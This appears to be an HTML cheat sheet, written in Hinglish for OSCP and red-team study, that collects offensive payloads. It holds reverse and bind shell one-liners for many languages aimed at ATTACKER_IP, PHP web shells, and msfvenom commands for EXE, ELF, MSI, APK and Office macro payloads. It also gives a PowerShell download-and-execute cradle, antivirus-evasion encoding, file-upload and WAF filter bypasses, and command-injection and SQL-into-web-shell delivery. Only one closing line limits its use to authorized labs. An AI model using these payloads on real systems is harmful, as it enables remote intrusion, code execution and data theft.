@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Payload Arsenal — All Types, Commands &amp; Explanation</title>
+<style>
+  :root{
+    --bg:#0b0f14; --panel:#111820; --panel2:#0e151c; --text:#d7e2ea; --muted:#7d93a3; --grid:#1c2731;
+    --c1:#3fd0ff; --c2:#ffb454; --c3:#5eff8f; --c4:#ff5c8a; --c5:#8a6bff; --c6:#ff8a3d;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:radial-gradient(circle at 15% 0%,#10202b 0%,transparent 45%),var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,-apple-system,sans-serif;line-height:1.55}
+  header{padding:48px 6vw 36px;border-bottom:1px solid var(--grid);background:linear-gradient(180deg,#0d1720,#0b0f14 90%)}
+  .eyebrow{font-family:Consolas,monospace;color:var(--c1);letter-spacing:.14em;font-size:12px;text-transform:uppercase}
+  h1{margin:10px 0 6px;font-size:clamp(26px,4vw,42px);font-weight:800;color:#f2f7fa}
+  .subtitle{color:var(--muted);font-size:15px;max-width:800px}
+  .badge-row{margin-top:22px;display:flex;gap:10px;flex-wrap:wrap}
+  .badge{font-family:Consolas,monospace;font-size:11px;padding:6px 12px;border-radius:20px;border:1px solid currentColor;text-transform:uppercase;letter-spacing:.05em}
+  main{padding:40px 6vw 90px;max-width:1150px;margin:0 auto}
+  .toc{display:grid;grid-template-columns:repeat(3,1fr);gap:9px;margin:0 0 50px}
+  @media(max-width:820px){.toc{grid-template-columns:1fr 1fr}}
+  .toc a{display:block;background:var(--panel);border:1px solid var(--grid);border-radius:8px;padding:9px 13px;color:#c3d1db;text-decoration:none;font-size:12px;font-family:Consolas,monospace}
+  .toc a:hover{border-color:var(--c1)}
+  .section{margin-bottom:52px}
+  .section-head{display:flex;align-items:baseline;gap:14px;border-bottom:1px solid var(--grid);padding-bottom:10px;margin-bottom:18px}
+  .section-num{font-family:Consolas,monospace;font-size:13px;color:var(--muted)}
+  .section h2{margin:0;font-size:21px;color:#f2f7fa}
+  .tag{margin-left:auto;font-family:Consolas,monospace;font-size:10.5px;padding:3px 10px;border-radius:14px;text-transform:uppercase;letter-spacing:.05em}
+  p{color:#c3d1db}
+  .note{background:var(--panel);border-left:3px solid var(--c1);padding:12px 16px;border-radius:0 8px 8px 0;margin:14px 0;font-size:13.5px;color:#b9c8d3}
+  .note.opsec{border-left-color:var(--c5)}
+  table{width:100%;border-collapse:collapse;background:var(--panel);border-radius:10px;overflow:hidden;font-size:13.5px;margin:14px 0 22px}
+  th{text-align:left;background:var(--panel2);color:var(--muted);font-family:Consolas,monospace;font-size:11px;text-transform:uppercase;letter-spacing:.06em;padding:11px 13px;border-bottom:1px solid var(--grid)}
+  td{padding:11px 13px;border-bottom:1px solid var(--grid);color:#c3d1db;vertical-align:top}
+  tr:last-child td{border-bottom:none}
+  pre{background:#080b0f;border:1px solid var(--grid);border-radius:8px;padding:14px 17px;overflow-x:auto;font-family:Consolas,monospace;font-size:12.5px;color:var(--c3);margin:8px 0 20px}
+  code.inline{background:#080b0f;color:var(--c3);padding:2px 6px;border-radius:4px;font-size:12.5px;border:1px solid var(--grid)}
+  .cm{color:#7d93a3}
+  footer{padding:28px 6vw 50px;color:var(--muted);font-size:12px;border-top:1px solid var(--grid);font-family:Consolas,monospace}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="eyebrow">OSCP + Red Team · Payload Reference</div>
+  <h1>Payload Arsenal</h1>
+  <p class="subtitle">Har type ka payload — reverse shells, bind shells, web shells, msfvenom payloads, staged vs stageless, encoding — sab explanation aur commands ke saath.</p>
+  <div class="badge-row">
+    <span class="badge" style="color:var(--c1)">Reverse Shells</span>
+    <span class="badge" style="color:var(--c2)">Bind Shells</span>
+    <span class="badge" style="color:var(--c4)">Web Shells</span>
+    <span class="badge" style="color:var(--c5)">msfvenom</span>
+    <span class="badge" style="color:var(--c6)">Encoding</span>
+  </div>
+</header>
+
+<main>
+
+  <div class="toc">
+    <a href="#s1">01 · Payload Concepts</a>
+    <a href="#s2">02 · Reverse Shells</a>
+    <a href="#s3">03 · Bind Shells</a>
+    <a href="#s4">04 · Web Shells</a>
+    <a href="#s5">05 · msfvenom Payloads</a>
+    <a href="#s6">06 · PowerShell Payloads</a>
+    <a href="#s7">07 · Staged vs Stageless</a>
+    <a href="#s8">08 · Encoding/Obfuscation</a>
+    <a href="#s9">09 · Shell Upgrade (TTY)</a>
+    <a href="#s10">10 · File Transfer Payloads</a>
+    <a href="#s11">11 · Delivery Methods</a>
+    <a href="#s12">12 · Advanced Tricks</a>
+    <a href="#s13">13 · Listener Tricks</a>
+  </div>
+
+  <!-- 1 -->
+  <div class="section" id="s1">
+    <div class="section-head"><span class="section-num">01</span><h2>Payload Concepts</h2><span class="tag" style="color:var(--c1)">Foundation</span></div>
+    <table>
+      <tr><th>Term</th><th>Explanation</th></tr>
+      <tr><td>Payload</td><td>Actual "attack code" jo target pe execute hota hai aur access deta hai</td></tr>
+      <tr><td>Reverse Shell</td><td>Target attacker ki taraf connection banata hai (attacker listener pe wait karta hai)</td></tr>
+      <tr><td>Bind Shell</td><td>Target khud ek port pe listen karta hai, attacker us port se connect karta hai</td></tr>
+      <tr><td>Listener</td><td>Attacker machine pe chalne wala process jo incoming connection ka wait karta hai</td></tr>
+      <tr><td>LHOST/LPORT</td><td>Attacker (listener) ka IP aur port — payload ko ye batana zaroori hai kaha connect karna hai</td></tr>
+    </table>
+    <div class="note">Reverse shell zyada common hai kyunki firewalls usually outbound connections ko easily block nahi karte (jitna inbound karte hain) — isliye target se attacker ki taraf connection banana easier hota hai.</div>
+  </div>
+
+  <!-- 2 -->
+  <div class="section" id="s2">
+    <div class="section-head"><span class="section-num">02</span><h2>Reverse Shells</h2><span class="tag" style="color:var(--c1)">Most Common</span></div>
+    <p>Sabse pehle listener start karo:</p>
+    <pre>nc -lvnp 4444</pre>
+
+    <table>
+      <tr><th>Language</th><th>Payload</th></tr>
+      <tr><td>Bash</td><td><pre style="margin:0">bash -i >&/dev/tcp/ATTACKER_IP/4444 0>&1</pre></td></tr>
+      <tr><td>Python3</td><td><pre style="margin:0">python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("bash")'</pre></td></tr>
+      <tr><td>PHP</td><td><pre style="margin:0">php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'</pre></td></tr>
+      <tr><td>Perl</td><td><pre style="margin:0">perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'</pre></td></tr>
+      <tr><td>Netcat (if -e supported)</td><td><pre style="margin:0">nc -e /bin/sh ATTACKER_IP 4444</pre></td></tr>
+      <tr><td>PowerShell (Windows)</td><td><pre style="margin:0">powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+'PS> ');$s.Write($sb,0,$sb.Length);$s.Flush()}"</pre></td></tr>
+    </table>
+
+    <div class="note">Tip: <strong>revshells.com</strong> jaisa cheat sheet website bhi bookmark kar — target IP/port daalke instantly copy-paste ready payload mil jaata hai, par tujhe manually samajhna aur likhna bhi aana chahiye (exam mein internet-generated payload copy karna helpful hai, par samajh zaroor honi chahiye).</div>
+  </div>
+
+  <!-- 3 -->
+  <div class="section" id="s3">
+    <div class="section-head"><span class="section-num">03</span><h2>Bind Shells</h2><span class="tag" style="color:var(--c2)">Less Common</span></div>
+    <p>Target khud listen karta hai, tu connect karta hai:</p>
+    <pre><span class="cm"># Target pe (agar command exec mil chuka hai):</span>
+nc -lvnp 4444 -e /bin/sh
+
+<span class="cm"># Attacker se connect:</span>
+nc TARGET_IP 4444</pre>
+    <div class="note">Bind shell tab use hoti hai jab target ka outbound traffic firewall se blocked ho, par inbound specific port allowed ho — kam common hai kyunki zyada firewalls outbound allow karte hain.</div>
+  </div>
+
+  <!-- 4 -->
+  <div class="section" id="s4">
+    <div class="section-head"><span class="section-num">04</span><h2>Web Shells</h2><span class="tag" style="color:var(--c4)">File Upload Vuln</span></div>
+    <p>File upload vulnerability milne pe use hota hai — server-side script upload karke browser se commands chalate hain.</p>
+    <table>
+      <tr><th>Type</th><th>Code</th></tr>
+      <tr><td>PHP (simple)</td><td><pre style="margin:0">&lt;?php system($_GET['cmd']); ?&gt;</pre>Use: <code class="inline">http://target/shell.php?cmd=whoami</code></td></tr>
+      <tr><td>PHP (POST-based, stealthier)</td><td><pre style="margin:0">&lt;?php system($_POST['cmd']); ?&gt;</pre></td></tr>
+      <tr><td>ASPX (Windows/IIS)</td><td>msfvenom se generate karo: <code class="inline">msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f aspx -o shell.aspx</code></td></tr>
+      <tr><td>JSP (Java servers)</td><td>msfvenom se generate karo: <code class="inline">msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.jsp</code></td></tr>
+    </table>
+    <div class="note">Upload restrictions bypass karne ke tarike: extension trick (shell.php.jpg), content-type header spoof, magic bytes add karna (GIF89a; prefix) — depend karta hai server kaise validate kar raha hai.</div>
+  </div>
+
+  <!-- 5 -->
+  <div class="section" id="s5">
+    <div class="section-head"><span class="section-num">05</span><h2>msfvenom Payloads (Metasploit Payload Generator)</h2><span class="tag" style="color:var(--c5)">Tool</span></div>
+    <table>
+      <tr><th>Target</th><th>Command</th></tr>
+      <tr><td>Windows EXE</td><td><pre style="margin:0">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe</pre></td></tr>
+      <tr><td>Linux ELF</td><td><pre style="margin:0">msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell.elf</pre></td></tr>
+      <tr><td>Windows MSI (AlwaysInstallElevated)</td><td><pre style="margin:0">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o payload.msi</pre></td></tr>
+      <tr><td>PHP webshell</td><td><pre style="margin:0">msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.php</pre></td></tr>
+      <tr><td>Android APK</td><td><pre style="margin:0">msfvenom -p android/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -o app.apk</pre></td></tr>
+      <tr><td>Macro (Office document)</td><td><pre style="margin:0">msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f vba</pre> (output ko Word/Excel macro mein paste karo)</td></tr>
+    </table>
+    <div class="note">Multi-handler listener (Metasploit ka apna listener) start karna zaroori hai jab meterpreter payload use kare:
+    <pre style="margin-top:8px">msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 4444; run"</pre></div>
+  </div>
+
+  <!-- 6 -->
+  <div class="section" id="s6">
+    <div class="section-head"><span class="section-num">06</span><h2>PowerShell-Specific Payloads (Windows)</h2><span class="tag" style="color:var(--c6)">Windows-Native</span></div>
+    <table>
+      <tr><th>Method</th><th>Command</th></tr>
+      <tr><td>Download &amp; Execute</td><td><pre style="margin:0">powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"</pre></td></tr>
+      <tr><td>Nishang reverse shell script</td><td>Nishang repo se Invoke-PowerShellTcp.ps1 use karo, host karo attacker se, download-execute karo</td></tr>
+      <tr><td>Base64 encoded command</td><td><pre style="margin:0">powershell -enc BASE64_ENCODED_COMMAND</pre> (detection thoda evade karta hai, block-full nahi)</td></tr>
+    </table>
+  </div>
+
+  <!-- 7 -->
+  <div class="section" id="s7">
+    <div class="section-head"><span class="section-num">07</span><h2>Staged vs Stageless Payloads</h2><span class="tag" style="color:var(--c5)">Concept</span></div>
+    <table>
+      <tr><th>Type</th><th>Kaise kaam karta hai</th><th>Pros/Cons</th></tr>
+      <tr><td><strong>Staged</strong></td><td>Chota "stager" pehle jaata hai, jo connect hote hi bada payload download karta hai</td><td>Chota initial size, par extra network call chahiye (kabhi AV/network monitoring pakad leta hai)</td></tr>
+      <tr><td><strong>Stageless</strong></td><td>Poora payload ek hi baar mein jaata hai, koi second download nahi</td><td>Bada size, par single-shot delivery — zyada reliable jab network monitored ho</td></tr>
+    </table>
+    <p style="font-size:13.5px">msfvenom naming convention: <code class="inline">windows/meterpreter/reverse_tcp</code> = staged, <code class="inline">windows/meterpreter_reverse_tcp</code> (underscore) = stageless.</p>
+  </div>
+
+  <!-- 8 -->
+  <div class="section" id="s8">
+    <div class="section-head"><span class="section-num">08</span><h2>Encoding / Basic Obfuscation</h2><span class="tag" style="color:var(--c6)">Evasion-lite</span></div>
+    <p>Encoding se payload ka signature thoda change hota hai — full AV bypass guarantee nahi, par basic detection kabhi evade ho jaata hai.</p>
+    <pre><span class="cm"># msfvenom encoder use karna</span>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell_encoded.exe
+
+<span class="cm"># Base64 encode karna (PowerShell ke liye)</span>
+echo -n "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/s.ps1')" | iconv -t UTF-16LE | base64 -w 0</pre>
+    <div class="note">Modern AV/EDR signature + behavior dono check karte hain — sirf encoding kaafi nahi hoti advanced evasion ke liye (jo Red Team roadmap ke Phase 5 mein deep cover hoga).</div>
+  </div>
+
+  <!-- 9 -->
+  <div class="section" id="s9">
+    <div class="section-head"><span class="section-num">09</span><h2>Shell Upgrade (Full Interactive TTY)</h2><span class="tag" style="color:var(--c3)">Post-Shell</span></div>
+    <p>Basic reverse shell milne ke baad, usse proper terminal jaisa banate hain (tab-complete, ctrl+c handling, clear screen sab kaam kare):</p>
+    <pre><span class="cm"># Step 1: Python se pty spawn karo</span>
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+<span class="cm"># Step 2: Background karo aur terminal settings match karo</span>
+<span class="cm"># Ctrl+Z dabao, phir attacker terminal mein:</span>
+stty raw -echo; fg
+<span class="cm"># Enter do 2 baar, phir:</span>
+export TERM=xterm</pre>
+  </div>
+
+  <!-- 10 -->
+  <div class="section" id="s10">
+    <div class="section-head"><span class="section-num">10</span><h2>File Transfer Payloads (Tool Upload karne ke liye)</h2><span class="tag" style="color:var(--c1)">Support Task</span></div>
+    <p>Foothold milne ke baad, LinPEAS/WinPEAS ya exploit binary target pe transfer karna hota hai:</p>
+    <table>
+      <tr><th>Direction</th><th>Method</th></tr>
+      <tr><td>Attacker → Linux target</td><td><pre style="margin:0">python3 -m http.server 8000
+<span class="cm"># target pe:</span>
+wget http://ATTACKER_IP:8000/linpeas.sh
+curl http://ATTACKER_IP:8000/linpeas.sh -o linpeas.sh</pre></td></tr>
+      <tr><td>Attacker → Windows target</td><td><pre style="margin:0">certutil -urlcache -split -f http://ATTACKER_IP:8000/shell.exe shell.exe
+<span class="cm"># ya PowerShell:</span>
+IWR -Uri http://ATTACKER_IP:8000/shell.exe -OutFile shell.exe</pre></td></tr>
+      <tr><td>SCP (agar SSH access hai)</td><td><pre style="margin:0">scp file.sh user@TARGET_IP:/tmp/</pre></td></tr>
+    </table>
+  </div>
+
+  <!-- 11 -->
+  <div class="section" id="s11">
+    <div class="section-head"><span class="section-num">11</span><h2>Payload Delivery — Kaise Daalte Hain (Context-wise)</h2><span class="tag" style="color:var(--c2)">Delivery Methods</span></div>
+    <p>Payload ka type aur delivery method hamesha <strong>us vulnerability pe depend karta hai jo mili hai</strong> — alag-alag situations mein alag method use hota hai:</p>
+
+    <table>
+      <tr><th>Vulnerability Type</th><th>Payload Type</th><th>Delivery Method</th></tr>
+      <tr><td><strong>Command Injection</strong></td><td>Reverse Shell one-liner (Bash/Python)</td><td>Seedha vulnerable field mein inject karo — jaise IP field mein <code class="inline">127.0.0.1; bash -i >&/dev/tcp/IP/4444 0>&1</code></td></tr>
+      <tr><td><strong>File Upload Vuln</strong></td><td>Web Shell (PHP/ASPX/JSP)</td><td>Malicious file upload karo, phir URL se access karo — <code class="inline">http://target/uploads/shell.php?cmd=whoami</code></td></tr>
+      <tr><td><strong>LFI + Log Poisoning</strong></td><td>PHP code in logs</td><td>User-Agent mein PHP inject karo, phir log file ko LFI ke through include karo — code execute ho jaata hai</td></tr>
+      <tr><td><strong>SQLi (write privilege)</strong></td><td>Web Shell via SQL</td><td><code class="inline">SELECT '&lt;?php system($_GET["cmd"]); ?&gt;' INTO OUTFILE '/var/www/html/shell.php'</code></td></tr>
+      <tr><td><strong>Service exploit (CVE)</strong></td><td>msfvenom EXE/ELF binary</td><td>Exploit ke saath shellcode embed hota hai — exploit run karte waqt payload automatically execute ho jaata hai</td></tr>
+      <tr><td><strong>Weak SSH creds</strong></td><td>Koi payload nahi chahiye</td><td>Seedha <code class="inline">ssh user@target</code> — pehle se access mil jaata hai, bas privesc karna hoga</td></tr>
+      <tr><td><strong>WinRM/SMB with creds</strong></td><td>Direct shell tools</td><td><code class="inline">evil-winrm</code> ya <code class="inline">psexec.py</code> — binary upload ki zaroorat nahi, built-in execution</td></tr>
+      <tr><td><strong>AlwaysInstallElevated</strong></td><td>MSI payload (msfvenom)</td><td>MSI file generate karke target pe transfer karo, <code class="inline">msiexec /quiet /i payload.msi</code> se run karo</td></tr>
+    </table>
+
+    <div class="note">Simple rule: <strong>Jo vulnerability mili, pehle dekho us vulnerability ke through kya execute ho sakta hai</strong> (OS command? File write? Code execution?) — phir usi execution method ke hisaab se payload choose karo. Payload select pehle mat karo, vulnerability identify pehle karo.</div>
+  </div>
+
+  <!-- 12 -->
+  <div class="section" id="s12">
+    <div class="section-head"><span class="section-num">12</span><h2>Advanced Tricks</h2><span class="tag" style="color:var(--c4)">Pro Level</span></div>
+
+    <table>
+      <tr><th>Trick</th><th>Kab use hota hai</th><th>Command/Method</th></tr>
+
+      <tr><td><strong>Double extension bypass</strong></td><td>File upload filter .php block kare par server php execute karta ho</td><td>File naam: <code class="inline">shell.php.jpg</code> ya <code class="inline">shell.php%00.jpg</code> (null byte) — server extension galat read kar leta hai</td></tr>
+
+      <tr><td><strong>Magic bytes spoof</strong></td><td>Server file ka actual content/magic bytes check kare, sirf extension nahi</td><td>PHP webshell ke shuru mein GIF header add karo: <pre style="margin:4px 0">GIF89a;
+&lt;?php system($_GET['cmd']); ?&gt;</pre>Server isse image samjhega par PHP execute hogi</td></tr>
+
+      <tr><td><strong>URL-encoded payload</strong></td><td>WAF/input filter special characters block kare</td><td>Payload ko URL encode karke pass karo — <code class="inline">%62%61%73%68%20...</code> — WAF plain text match nahi kar pata</td></tr>
+
+      <tr><td><strong>IFS variable abuse (Bash)</strong></td><td>Spaces filter ho rahi hoon command injection mein</td><td><code class="inline">${IFS}</code> space ki jagah use karo: <code class="inline">cat${IFS}/etc/passwd</code></td></tr>
+
+      <tr><td><strong>Payload port choice</strong></td><td>Firewall common ports block kare</td><td>Port 4444 ki jagah <code class="inline">443</code> ya <code class="inline">80</code> use karo listener ke liye — ye ports usually outbound allow hote hain firewall mein</td></tr>
+
+      <tr><td><strong>Socat fully interactive shell</strong></td><td>nc se better shell chahiye (fully interactive, color, tab-complete)</td><td><pre style="margin:4px 0"><span class="cm"># Attacker:</span>
+socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
+<span class="cm"># Target:</span>
+socat exec:'bash -li',pty,stderr,sane TCP:ATTACKER_IP:4444</pre></td></tr>
+
+      <tr><td><strong>Named pipe shell (Windows)</strong></td><td>Standard reverse shell block ho jaaye Windows pe</td><td><pre style="margin:4px 0">cmd.exe /c echo whoami | powershell -command "$p=new-object System.IO.Pipes.NamedPipeServerStream('mypipe');$p.WaitForConnection()"</pre></td></tr>
+
+      <tr><td><strong>Payload via environment variable</strong></td><td>Command length limit ho ya filter bypass karna ho</td><td><pre style="margin:4px 0">export CMD='bash -i >&/dev/tcp/IP/4444 0>&1'
+bash -c $CMD</pre></td></tr>
+
+      <tr><td><strong>Meterpreter over HTTPS</strong></td><td>Plain TCP payload AV/network filter se pakda ja raha ho</td><td><pre style="margin:4px 0">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -f exe -o shell.exe</pre>HTTPS traffic normal lagta hai — less suspicious</td></tr>
+
+      <tr><td><strong>Payload inside image (steganography — advanced)</strong></td><td>Content inspection hoti ho</td><td>exiftool se image ke comment field mein PHP code inject karo, phir server pe include karke execute karo</td></tr>
+    </table>
+  </div>
+
+  <!-- 13 -->
+  <div class="section" id="s13">
+    <div class="section-head"><span class="section-num">13</span><h2>Listener Tricks</h2><span class="tag" style="color:var(--c1)">Pro Setup</span></div>
+    <table>
+      <tr><th>Trick</th><th>Command</th></tr>
+      <tr><td>rlwrap — arrow keys aur history support nc mein</td><td><pre style="margin:4px 0">rlwrap nc -lvnp 4444</pre></td></tr>
+      <tr><td>Multiple connections same port pe (pwncat)</td><td><pre style="margin:4px 0">pwncat-cs -lp 4444</pre>pwncat auto TTY upgrade bhi karta hai</td></tr>
+      <tr><td>Metasploit multi-handler (meterpreter ke liye)</td><td><pre style="margin:4px 0">use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+run -j</pre></td></tr>
+    </table>
+  </div>
+
+  <div class="note opsec">
+    <strong>Yaad rakh:</strong> Ye saare payloads sirf authorized lab/exam environment (TryHackMe/HackTheBox/PG Practice/OSCP exam) mein use karne hain. Real unauthorized systems pe kabhi nahi.
+  </div>
+
+</main>
+
+<footer>
+  Payload Arsenal · OSCP + Red Team Reference · Karan's Reference Vault
+</footer>
+
+</body>
+</html>
